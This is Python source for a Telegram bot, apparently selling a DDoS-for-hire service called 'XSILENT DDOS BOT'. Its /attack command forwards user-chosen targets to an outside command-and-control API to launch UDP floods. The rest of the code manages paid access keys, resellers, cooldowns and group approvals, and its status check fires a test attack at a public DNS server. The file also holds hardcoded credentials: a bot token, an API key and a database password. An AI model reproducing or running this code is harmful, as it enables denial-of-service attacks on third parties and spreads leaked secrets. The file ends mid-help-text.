#!/usr/bin/env python3
import telebot
import requests
import time
import threading
import json
import os
import random
import string
import re
from datetime import datetime, timedelta
from collections import defaultdict
from pymongo import MongoClient

# ========== CONFIG ==========
BOT_TOKEN = "8291785662:AAE49V61h5jILkH7Fk_rL8haaAgHwLcY6wE"
ADMIN_ID = ["8487946379"]
API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
API_KEY = "WkhgMWL"
MAX_CONCURRENT = 2

# ========== MONGODB CONNECTION ==========
MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
client = MongoClient(MONGO_URI)
db = client["xsilent_bot"]
users_collection = db["users"]
keys_collection = db["keys"]
groups_collection = db["groups"]
settings_collection = db["settings"]
blocked_users_collection = db["blocked_users"]

# ========== DATA STRUCTURES ==========
active_attacks = {}
cooldown = {}
group_attack_times = {}

# ========== LOAD DATA FROM MONGODB ==========
def load_users():
    users_data = users_collection.find_one({"_id": "users"})
    if not users_data:
        users_collection.insert_one({"_id": "users", "users": [ADMIN_ID[0]], "resellers": []})
        return {"users": [ADMIN_ID[0]], "resellers": []}
    return users_data

def load_keys():
    keys = {}
    for key_data in keys_collection.find():
        keys[key_data["key"]] = {
            "user_id": key_data.get("user_id"),
            "duration_value": key_data.get("duration_value"),
            "duration_unit": key_data.get("duration_unit"),
            "generated_by": key_data.get("generated_by"),
            "generated_at": key_data.get("generated_at"),
            "expires_at": key_data.get("expires_at"),
            "used": key_data.get("used", False),
            "used_by": key_data.get("used_by"),
            "used_at": key_data.get("used_at")
        }
    return keys

def save_users(data):
    users_collection.update_one({"_id": "users"}, {"$set": data}, upsert=True)

def save_keys(keys_data):
    keys_collection.delete_many({})
    for key, info in keys_data.items():
        keys_collection.insert_one({
            "key": key,
            "user_id": info.get("user_id"),
            "duration_value": info.get("duration_value"),
            "duration_unit": info.get("duration_unit"),
            "generated_by": info.get("generated_by"),
            "generated_at": info.get("generated_at"),
            "expires_at": info.get("expires_at"),
            "used": info.get("used", False),
            "used_by": info.get("used_by"),
            "used_at": info.get("used_at")
        })

def load_groups():
    groups = {}
    for group_data in groups_collection.find():
        groups[group_data["group_id"]] = {
            "attack_time": group_data.get("attack_time", 60),
            "added_by": group_data.get("added_by"),
            "added_at": group_data.get("added_at")
        }
    return groups

def save_group(group_id, attack_time, added_by):
    groups_collection.update_one(
        {"group_id": group_id},
        {"$set": {
            "attack_time": attack_time,
            "added_by": added_by,
            "added_at": time.time()
        }},
        upsert=True
    )

def remove_group(group_id):
    groups_collection.delete_one({"group_id": group_id})

def get_group_attack_time(group_id):
    group = groups_collection.find_one({"group_id": group_id})
    if group:
        return group.get("attack_time", 60)
    return None

# Blocked users functions
def load_blocked_users():
    blocked_users = {}
    for blocked_data in blocked_users_collection.find():
        blocked_users[blocked_data["user_id"]] = {
            "blocked_by": blocked_data.get("blocked_by"),
            "blocked_at": blocked_data.get("blocked_at"),
            "reason": blocked_data.get("reason", "No reason provided")
        }
    return blocked_users

def save_blocked_user(user_id, blocked_by, reason="No reason provided"):
    blocked_users_collection.update_one(
        {"user_id": user_id},
        {"$set": {
            "user_id": user_id,
            "blocked_by": blocked_by,
            "blocked_at": time.time(),
            "reason": reason
        }},
        upsert=True
    )

def remove_blocked_user(user_id):
    blocked_users_collection.delete_one({"user_id": user_id})

def is_user_blocked(user_id):
    return blocked_users_collection.find_one({"user_id": user_id}) is not None

users_data = load_users()
users = users_data["users"]
resellers = users_data.get("resellers", [])
keys_data = load_keys()
groups = load_groups()
blocked_users = load_blocked_users()

bot = telebot.TeleBot(BOT_TOKEN)

# ========== HELPER FUNCTIONS ==========
def generate_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def parse_duration(duration_str):
    duration_str = duration_str.lower().strip()
    
    if duration_str.isdigit():
        return int(duration_str), "day"
    
    if duration_str.endswith('h'):
        hours = duration_str.replace('h', '')
        if hours.isdigit():
            return int(hours), "hour"
    
    return None, None

def get_expiry_date(value, unit):
    if unit == "hour":
        return datetime.now() + timedelta(hours=value)
    else:
        return datetime.now() + timedelta(days=value)

def format_duration(value, unit):
    if unit == "hour":
        return str(value) + " Hour(s)"
    else:
        return str(value) + " Day(s)"

def check_total_active_attacks():
    now = time.time()
    count = 0
    for attack_id, info in list(active_attacks.items()):
        if now < info["finish_time"]:
            count += 1
        else:
            del active_attacks[attack_id]
    return count

def check_active_attack_by_target(ip, port):
    target_key = ip + ":" + str(port)
    now = time.time()
    for attack_id, attack_info in list(active_attacks.items()):
        if attack_info["target_key"] == target_key:
            if now < attack_info["finish_time"]:
                return attack_info
            else:
                del active_attacks[attack_id]
                return None
    return None

def format_attack_status():
    now = time.time()
    slot1_free = True
    slot2_free = True
    slot1_info = None
    slot2_info = None
    
    slots = []
    for attack_id, info in active_attacks.items():
        if now < info["finish_time"]:
            remaining = int(info["finish_time"] - now)
            slots.append({
                "target": info["target_key"],
                "user": info["user"],
                "remaining": remaining
            })
    
    if len(slots) >= 1:
        slot1_free = False
        slot1_info = "🎯 " + slots[0]["target"] + "\n   👤 " + slots[0]["user"] + "\n   ⏰ " + str(slots[0]["remaining"]) + "s left"
    
    if len(slots) >= 2:
        slot2_free = False
        slot2_info = "🎯 " + slots[1]["target"] + "\n   👤 " + slots[1]["user"] + "\n   ⏰ " + str(slots[1]["remaining"]) + "s left"
    
    return slot1_free, slot2_free, slot1_info, slot2_info

def remove_user_from_system(user_id):
    if user_id in users:
        users.remove(user_id)
    if user_id in resellers:
        resellers.remove(user_id)
    users_data["users"] = users
    users_data["resellers"] = resellers
    save_users(users_data)
    
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == user_id:
            del active_attacks[attack_id]
    
    if user_id in cooldown:
        del cooldown[user_id]
    
    return True

def check_user_expiry(user_id):
    now = time.time()
    for key, info in keys_data.items():
        if info.get("used_by") == user_id and info.get("used") == True:
            if now < info["expires_at"]:
                return True
    return False

def is_user_in_approved_group(user_id):
    for group_id, group_info in groups.items():
        try:
            member = bot.get_chat_member(group_id, user_id)
            if member.status in ["member", "administrator", "creator"]:
                return group_id
        except:
            continue
    return None

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start(msg):
    uid = str(msg.chat.id)
    chat_type = msg.chat.type
    
    # Check if user is blocked
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
        return
    
    if chat_type == "group" or chat_type == "supergroup":
        group_id = str(msg.chat.id)
        attack_time = get_group_attack_time(group_id)
        if attack_time:
            bot.reply_to(msg, "🔥 XSILENT DDOS BOT - GROUP\n\n✅ Group Approved!\n⚡ Attack Time: " + str(attack_time) + "s\n\n📝 COMMANDS:\n/attack IP PORT\n/help\n/start")
        else:
            bot.reply_to(msg, "❌ Group not approved! Contact owner to add this group.")
        return
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - OWNER\n\n✅ Full Access\n⚡ Total Concurrent: 2\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/removekey KEY\n/add USER\n/remove USER\n/addreseller USER\n/removereseller USER\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/broadcast MSG\n/stopattack IP:PORT\n/allusers\n/allgroups\n/api_status\n/block USER_ID REASON\n/unblock USER_ID\n/blockedlist")
    elif uid in resellers:
        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - RESELLER\n\n✅ Reseller Access\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/genkey 1\n/genkey 5h\n/mykeys")
    elif uid in users:
        has_active = check_user_expiry(uid)
        bot.reply_to(msg, "🔥 XSILENT DDOS BOT - USER\n\n✅ Status: " + ("Active" if has_active else "Expired") + "\n⚡ Total Concurrent: 2\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/redeem KEY")
    else:
        bot.reply_to(msg, "❌ Unauthorized! Use /redeem KEY")

@bot.message_handler(commands=['host'])
def host_command(msg):
    """Command to block bot host commands"""
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(msg, "📝 Usage: /host <command>\n\nExample: /host /start\n\nThis will block the command on the bot host.")
        return
    
    command_to_block = args[1].strip()
    
    # Save blocked command to database
    blocked_commands = settings_collection.find_one({"_id": "blocked_commands"})
    if not blocked_commands:
        blocked_commands = {"_id": "blocked_commands", "commands": []}
    
    if command_to_block not in blocked_commands["commands"]:
        blocked_commands["commands"].append(command_to_block)
        settings_collection.update_one(
            {"_id": "blocked_commands"},
            {"$set": {"commands": blocked_commands["commands"]}},
            upsert=True
        )
        bot.reply_to(msg, f"✅ Command '{command_to_block}' has been blocked on the bot host!\n\nAnyone trying to use this command will see: 🚫 BLOCKED BOT")
    else:
        bot.reply_to(msg, f"⚠️ Command '{command_to_block}' is already blocked!")

# Block user command
@bot.message_handler(commands=['block'])
def block_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split(maxsplit=2)
    if len(args) < 2:
        bot.reply_to(msg, "📝 Usage: /block USER_ID [REASON]\n\nExample: /block 123456789 Spamming attacks")
        return
    
    user_to_block = args[1]
    reason = args[2] if len(args) > 2 else "No reason provided"
    
    if is_user_blocked(user_to_block):
        bot.reply_to(msg, f"⚠️ User {user_to_block} is already blocked!")
        return
    
    save_blocked_user(user_to_block, uid, reason)
    
    # Remove from users list if present
    if user_to_block in users:
        users.remove(user_to_block)
        users_data["users"] = users
        save_users(users_data)
    
    # Remove from resellers list if present
    if user_to_block in resellers:
        resellers.remove(user_to_block)
        users_data["resellers"] = resellers
        save_users(users_data)
    
    bot.reply_to(msg, f"✅ USER BLOCKED!\n\n👤 User: {user_to_block}\n📝 Reason: {reason}\n\nUser can no longer use the bot!")
    
    try:
        bot.send_message(user_to_block, f"🚫 You have been blocked from using this bot!\n\nReason: {reason}\n\nContact owner for more information.")
    except:
        pass

# Unblock user command
@bot.message_handler(commands=['unblock'])
def unblock_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "📝 Usage: /unblock USER_ID\n\nExample: /unblock 123456789")
        return
    
    user_to_unblock = args[1]
    
    if not is_user_blocked(user_to_unblock):
        bot.reply_to(msg, f"⚠️ User {user_to_unblock} is not blocked!")
        return
    
    remove_blocked_user(user_to_unblock)
    bot.reply_to(msg, f"✅ USER UNBLOCKED!\n\n👤 User: {user_to_unblock}\n\nUser can now use the bot again!")
    
    try:
        bot.send_message(user_to_unblock, "✅ You have been unblocked! You can now use the bot again.")
    except:
        pass

# List blocked users command
@bot.message_handler(commands=['blockedlist'])
def blocked_list(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    blocked_users_list = list(blocked_users_collection.find())
    
    if not blocked_users_list:
        bot.reply_to(msg, "📋 No blocked users found.")
        return
    
    blocked_msg = "🚫 BLOCKED USERS LIST\n\n"
    for i, user in enumerate(blocked_users_list, 1):
        blocked_msg += f"{i}. 👤 User: {user['user_id']}\n"
        blocked_msg += f"   📝 Reason: {user.get('reason', 'No reason')}\n"
        blocked_msg += f"   👮 Blocked by: {user.get('blocked_by', 'Unknown')}\n"
        blocked_msg += f"   📅 Date: {datetime.fromtimestamp(user.get('blocked_at', time.time())).strftime('%Y-%m-%d %H:%M:%S')}\n\n"
    
    bot.reply_to(msg, blocked_msg)

@bot.message_handler(commands=['attack'])
def attack(msg):
    uid = str(msg.chat.id)
    
    # Check if user is blocked
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
        return
    
    chat_type = msg.chat.type
    is_group = (chat_type == "group" or chat_type == "supergroup")
    
    if is_group:
        group_id = str(msg.chat.id)
        attack_time_limit = get_group_attack_time(group_id)
        if not attack_time_limit:
            bot.reply_to(msg, "❌ Group not approved!")
            return
    else:
        attack_time_limit = 300
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers and not is_group:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    if not is_group and uid not in ADMIN_ID and not check_user_expiry(uid):
        bot.reply_to(msg, "❌ Your access has expired!\nUse /redeem KEY to activate new key.")
        return
    
    total_active = check_total_active_attacks()
    if total_active >= MAX_CONCURRENT:
        bot.reply_to(msg, "❌ Both attack slots are full!\nTotal active: " + str(total_active) + "/" + str(MAX_CONCURRENT) + "\nUse /status to check when a slot frees up")
        return
    
    if uid in cooldown and not is_group:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            bot.reply_to(msg, "⏳ Wait " + str(int(remaining)) + " seconds!")
            return
    
    args = msg.text.split()
    if is_group:
        if len(args) != 3:
            bot.reply_to(msg, "Usage: /attack IP PORT\nExample: /attack 1.1.1.1 443")
            return
        ip, port = args[1], args[2]
        duration = attack_time_limit
    else:
        if len(args) != 4:
            bot.reply_to(msg, "Usage: /attack IP PORT TIME\nExample: /attack 1.1.1.1 443 60")
            return
        ip, port, duration = args[1], args[2], args[3]
        try:
            duration = int(duration)
        except:
            bot.reply_to(msg, "❌ Invalid time!")
            return
    
    try:
        port = int(port)
        if duration < 10 or duration > attack_time_limit:
            bot.reply_to(msg, "❌ Duration 10-" + str(attack_time_limit) + " seconds!")
            return
    except:
        bot.reply_to(msg, "❌ Invalid port!")
        return
    
    existing_attack = check_active_attack_by_target(ip, port)
    if existing_attack:
        remaining = int(existing_attack["finish_time"] - time.time())
        bot.reply_to(msg, "❌ TARGET UNDER ATTACK!\n\n🎯 " + ip + ":" + str(port) + " already being attacked\n👤 By: " + existing_attack['user'] + "\n⏰ Finishes in: " + str(remaining) + "s")
        return
    
    if not is_group:
        cooldown[uid] = time.time()
    
    attack_id = uid + "_" + str(int(time.time()))
    target_key = ip + ":" + str(port)
    finish_time = time.time() + duration
    
    active_attacks[attack_id] = {
        "user": uid,
        "finish_time": finish_time,
        "ip": ip,
        "port": port,
        "target_key": target_key,
        "start_time": time.time()
    }
    
    new_total = check_total_active_attacks()
    bot.reply_to(msg, "🔥 ATTACK LAUNCHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n⚡ Method: UDP (Auto)\n📊 Total active slots: " + str(new_total) + "/" + str(MAX_CONCURRENT))
    
    def run():
        try:
            api_params = {
                "api_key": API_KEY,
                "target": ip,
                "port": port,
                "time": duration,
                "concurrent": 1,
                "method": "udp"
            }
            
            response = requests.get(API_URL, params=api_params, timeout=10)
            
            if response.status_code == 200:
                time.sleep(duration)
                bot.send_message(msg.chat.id, "✅ ATTACK FINISHED!\n\n🎯 Target: " + ip + ":" + str(port) + "\n⏱️ Duration: " + str(duration) + "s\n🔄 Restart your game!")
            else:
                bot.send_message(msg.chat.id, "❌ Attack failed!")
                
        except Exception as e:
            bot.send_message(msg.chat.id, "❌ Attack error!")
        finally:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['redeem'])
def redeem(msg):
    uid = str(msg.chat.id)
    
    # Check if user is blocked
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
        return
    
    if uid in ADMIN_ID:
        bot.reply_to(msg, "❌ You are owner, you already have unlimited access!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /redeem KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Invalid key!")
        return
    
    key_info = keys_data[key]
    
    if key_info.get("used", False):
        bot.reply_to(msg, "❌ Key already used!")
        return
    
    # Check if key is expired
    if time.time() > key_info.get("expires_at", 0):
        bot.reply_to(msg, "❌ Key has expired!")
        return
    
    # Check if user already has an active subscription
    user_has_active = check_user_expiry(uid)
    
    # Mark key as used
    key_info["used"] = True
    key_info["used_by"] = uid
    key_info["used_at"] = time.time()
    keys_data[key] = key_info
    save_keys(keys_data)
    
    # Calculate new expiry
    if user_has_active:
        # Find current expiry and extend
        current_expiry = 0
        for k, info in keys_data.items():
            if info.get("used_by") == uid and info.get("used") == True:
                if info.get("expires_at", 0) > current_expiry:
                    current_expiry = info.get("expires_at", 0)
        
        if current_expiry > time.time():
            new_expiry = current_expiry + (key_info["expires_at"] - key_info["generated_at"])
        else:
            new_expiry = key_info["expires_at"]
    else:
        new_expiry = key_info["expires_at"]
    
    # Add user if not already in system
    if uid not in users and uid not in ADMIN_ID:
        users.append(uid)
        users_data["users"] = users
        save_users(users_data)
    
    # Create a new key record with updated expiry for the user
    new_key_record = key_info.copy()
    new_key_record["expires_at"] = new_expiry
    keys_data[key + "_used"] = new_key_record
    
    expiry_date = datetime.fromtimestamp(new_expiry).strftime('%Y-%m-%d %H:%M:%S')
    bot.reply_to(msg, f"✅ KEY REDEEMED SUCCESSFULLY!\n\n🔑 Key: {key}\n👤 User: {uid}\n⏰ Access until: {expiry_date}\n\nYou now have attack access! Use /attack to start attacking.")
    
    # Notify admin
    for admin in ADMIN_ID:
        try:
            bot.send_message(admin, f"✅ Key redeemed!\nUser: {uid}\nKey: {key}\nExpires: {expiry_date}")
        except:
            pass

@bot.message_handler(commands=['status'])
def status(msg):
    uid = str(msg.chat.id)
    
    # Check if user is blocked
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
        return
    
    if uid not in users and uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Unauthorized!")
        return
    
    slot1_free, slot2_free, slot1_info, slot2_info = format_attack_status()
    total_active = check_total_active_attacks()
    
    status_msg = "📊 SLOT STATUS\n\n"
    
    if slot1_free:
        status_msg += "✅ SLOT 1: FREE\n"
    else:
        status_msg += "❌ SLOT 1: BUSY\n" + slot1_info + "\n"
    
    status_msg += "\n"
    
    if slot2_free:
        status_msg += "✅ SLOT 2: FREE\n"
    else:
        status_msg += "❌ SLOT 2: BUSY\n" + slot2_info + "\n"
    
    status_msg += "\n📊 TOTAL ACTIVE: " + str(total_active) + "/" + str(MAX_CONCURRENT)
    
    if uid in cooldown:
        remaining = 30 - (time.time() - cooldown[uid])
        if remaining > 0:
            status_msg += "\n⏳ YOUR COOLDOWN: " + str(int(remaining)) + "s"
    
    bot.reply_to(msg, status_msg)

@bot.message_handler(commands=['genkey'])
def genkey(msg):
    uid = str(msg.chat.id)
    
    # Check if user is blocked
    if is_user_blocked(uid):
        bot.reply_to(msg, "🚫 You are blocked from using this bot!")
        return
    
    if uid not in ADMIN_ID and uid not in resellers:
        bot.reply_to(msg, "❌ Admin or Reseller only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /genkey 1 (1 day) or /genkey 5h (5 hours)")
        return
    
    duration_str = args[1]
    
    value, unit = parse_duration(duration_str)
    if value is None:
        bot.reply_to(msg, "❌ Invalid duration!\nUse: 1 (1 day) or 5h (5 hours)")
        return
    
    key = generate_key()
    expires_at = get_expiry_date(value, unit)
    
    keys_data[key] = {
        "user_id": "pending",
        "duration_value": value,
        "duration_unit": unit,
        "generated_by": uid,
        "generated_at": time.time(),
        "expires_at": expires_at.timestamp(),
        "used": False
    }
    save_keys(keys_data)
    
    expiry_str = expires_at.strftime('%Y-%m-%d %H:%M:%S')
    duration_display = format_duration(value, unit)
    
    bot.reply_to(msg, "✅ KEY GENERATED!\n\n🔑 Key: `" + key + "`\n⏰ Duration: " + duration_display + "\n📅 Expires: " + expiry_str + "\n\nShare this key with user!\nUser: /redeem " + key)

@bot.message_handler(commands=['removekey'])
def remove_key(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removekey KEY")
        return
    
    key = args[1]
    
    if key not in keys_data:
        bot.reply_to(msg, "❌ Key not found!")
        return
    
    del keys_data[key]
    save_keys(keys_data)
    
    bot.reply_to(msg, "✅ KEY REMOVED!\nKey: " + key)

@bot.message_handler(commands=['add'])
def add_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /add USER_ID")
        return
    
    new_user = args[1]
    
    if new_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner!")
        return
    
    if is_user_blocked(new_user):
        bot.reply_to(msg, "❌ This user is blocked! Unblock them first.")
        return
    
    if new_user in users:
        bot.reply_to(msg, "❌ User already has access!")
        return
    
    users.append(new_user)
    users_data["users"] = users
    save_users(users_data)
    
    bot.reply_to(msg, "✅ USER ADDED!\n\n👤 User: " + new_user + "\n✅ Now has attack access!")
    
    try:
        bot.send_message(new_user, "✅ You have been granted attack access!\nUse /start to see commands")
    except:
        pass

@bot.message_handler(commands=['remove'])
def remove_user(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /remove USER_ID")
        return
    
    target_user = args[1]
    
    if target_user in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    
    if target_user not in users:
        bot.reply_to(msg, "❌ User not found!")
        return
    
    users.remove(target_user)
    users_data["users"] = users
    save_users(users_data)
    
    if target_user in resellers:
        resellers.remove(target_user)
        users_data["resellers"] = resellers
        save_users(users_data)
    
    for attack_id in list(active_attacks.keys()):
        if active_attacks[attack_id]["user"] == target_user:
            del active_attacks[attack_id]
    
    if target_user in cooldown:
        del cooldown[target_user]
    
    bot.reply_to(msg, "✅ USER REMOVED!\n\n👤 User: " + target_user + "\n❌ Attack access revoked!")
    
    try:
        bot.send_message(target_user, "⚠️ Your attack access has been revoked by owner!")
    except:
        pass

@bot.message_handler(commands=['addreseller'])
def add_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /addreseller USER_ID")
        return
    
    new_reseller = args[1]
    
    if new_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot add owner as reseller!")
        return
    
    if is_user_blocked(new_reseller):
        bot.reply_to(msg, "❌ This user is blocked! Unblock them first.")
        return
    
    if new_reseller in resellers:
        bot.reply_to(msg, "❌ User is already a reseller!")
        return
    
    resellers.append(new_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    if new_reseller not in users:
        users.append(new_reseller)
        users_data["users"] = users
        save_users(users_data)
    
    bot.reply_to(msg, "✅ RESELLER ADDED!\n\n👤 Reseller: " + new_reseller + "\n🔑 Can now generate keys using /genkey")
    
    try:
        bot.send_message(new_reseller, "✅ You have been added as RESELLER!\nYou can now generate keys using /genkey")
    except:
        pass

@bot.message_handler(commands=['removereseller'])
def remove_reseller(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removereseller USER_ID")
        return
    
    target_reseller = args[1]
    
    if target_reseller in ADMIN_ID:
        bot.reply_to(msg, "❌ Cannot remove owner!")
        return
    
    if target_reseller not in resellers:
        bot.reply_to(msg, "❌ User is not a reseller!")
        return
    
    resellers.remove(target_reseller)
    users_data["resellers"] = resellers
    save_users(users_data)
    
    bot.reply_to(msg, "✅ RESELLER REMOVED!\n\n👤 User: " + target_reseller + "\n❌ Can no longer generate keys")
    
    try:
        bot.send_message(target_reseller, "⚠️ Your reseller privileges have been removed!")
    except:
        pass

@bot.message_handler(commands=['addgroup'])
def add_group(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 3:
        bot.reply_to(msg, "Usage: /addgroup GROUP_ID TIME (seconds)\nExample: /addgroup -100123456789 60")
        return
    
    group_id = args[1]
    attack_time = int(args[2])
    
    if attack_time < 30 or attack_time > 300:
        bot.reply_to(msg, "❌ Attack time must be between 30 and 300 seconds!")
        return
    
    save_group(group_id, attack_time, uid)
    
    bot.reply_to(msg, f"✅ GROUP ADDED!\n\nGroup ID: {group_id}\nAttack Time: {attack_time}s")
    
    try:
        bot.send_message(int(group_id), f"✅ Group approved!\nAttack time: {attack_time}s\nUse /attack IP PORT in this group!")
    except:
        pass

@bot.message_handler(commands=['removegroup'])
def remove_group_cmd(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /removegroup GROUP_ID")
        return
    
    group_id = args[1]
    remove_group(group_id)
    
    bot.reply_to(msg, f"✅ GROUP REMOVED!\nGroup ID: {group_id}")

@bot.message_handler(commands=['broadcast'])
def broadcast(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split(maxsplit=1)
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /broadcast MESSAGE")
        return
    
    broadcast_msg = args[1]
    
    success = 0
    failed = 0
    
    for user in users:
        try:
            bot.send_message(user, f"📢 BROADCAST MESSAGE:\n\n{broadcast_msg}")
            success += 1
        except:
            failed += 1
    
    bot.reply_to(msg, f"✅ BROADCAST SENT!\n\nSent: {success}\nFailed: {failed}")

@bot.message_handler(commands=['stopattack'])
def stop_attack(msg):
    uid = str(msg.chat.id)
    
    if uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    args = msg.text.split()
    if len(args) != 2:
        bot.reply_to(msg, "Usage: /stopattack IP:PORT\nExample: /stopattack 1.1.1.1:443")
        return
    
    target = args[1]
    
    stopped = 0
    for attack_id, info in list(active_attacks.items()):
        if info["target_key"] == target:
            del active_attacks[attack_id]
            stopped += 1
    
    if stopped > 0:
        bot.reply_to(msg, f"✅ STOPPED ATTACK!\nTarget: {target}\nStopped {stopped} attack(s)")
    else:
        bot.reply_to(msg, f"❌ No active attack found for target: {target}")

@bot.message_handler(commands=['allusers'])
def all_users(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    user_list = []
    for u in users:
        if u in ADMIN_ID:
            role = "👑 OWNER"
        elif u in resellers:
            role = "💎 RESELLER"
        else:
            role = "👤 USER"
        user_list.append(role + ": " + u)
    
    if user_list:
        response = "📋 ALL USERS:\n" + "\n".join(user_list) + f"\n\nTotal: {len(users)}"
    else:
        response = "📋 No users found."
    
    bot.reply_to(msg, response)

@bot.message_handler(commands=['allgroups'])
def all_groups(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    groups_list = []
    for group_id, group_info in groups.items():
        groups_list.append(f"Group: {group_id}\nAttack Time: {group_info['attack_time']}s\nAdded by: {group_info['added_by']}\n")
    
    if groups_list:
        response = "📋 ALL GROUPS:\n\n" + "\n".join(groups_list) + f"\nTotal: {len(groups)}"
    else:
        response = "📋 No groups found."
    
    bot.reply_to(msg, response)

@bot.message_handler(commands=['api_status'])
def api_status(msg):
    if str(msg.chat.id) not in ADMIN_ID:
        bot.reply_to(msg, "❌ Owner only!")
        return
    
    try:
        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
        api_status_text = "✅ Online" if test_response.status_code == 200 else "❌ Offline"
        bot.reply_to(msg, f"{api_status_text}\nActive Attacks: {len(active_attacks)}")
    except:
        bot.reply_to(msg, "❌ API OFFLINE")

@bot.message_handler(commands=['mykeys'])
def my_keys(msg):
    uid = str(msg.chat.id)
    
    if uid not in resellers and uid not in ADMIN_ID:
        bot.reply_to(msg, "❌ Reseller only!")
        return
    
    user_keys = []
    for key, info in keys_data.items():
        if info.get("generated_by") == uid and not info.get("used", False):
            expiry_date = datetime.fromtimestamp(info.get("expires_at", 0)).strftime('%Y-%m-%d %H:%M:%S')
            duration = format_duration(info.get("duration_value", 0), info.get("duration_unit", "day"))
            user_keys.append(f"🔑 {key}\n   ⏰ {duration}\n   📅 Expires: {expiry_date}\n")
    
    if user_keys:
        response = "📋 YOUR KEYS:\n\n" + "\n".join(user_keys) + f"\nTotal: {len(user_keys)}"
    else:
        response = "📋 No keys generated yet.\nUse /genkey to create keys."
    
    bot.reply_to(msg, response)

@bot.message_handler(commands=['help'])
def help_cmd(msg):
    uid = str(msg.chat.id)
    
    if uid in ADMIN_ID:
        help_text = """🔥 XSILENT BOT HELP - OWNER

📝 ATTACK COMMANDS:
/attack IP PORT TIME - Start attack
/status - Check bot status

🔑 KEY COMMANDS:
/genkey 1 - Generate 1 day key
/genkey 5h - Generate 5 hour key
/removekey KEY - Remove key

👥 USER MANAGEMENT:
/add USER_ID - Add user
/remove USER_ID - Remove user
/addreseller USER_ID - Add reseller
/removereseller USER_ID - Remove reseller

👥 BLOCK COMMANDS:
/block USER_ID REASON - Block user
/unblock USER_ID - Unblock user
/blockedlist - List blocked users

👥 HOST COMMAND:
/host COMMAND - Block command on bot host

👥 GROUP MANAGEMENT:
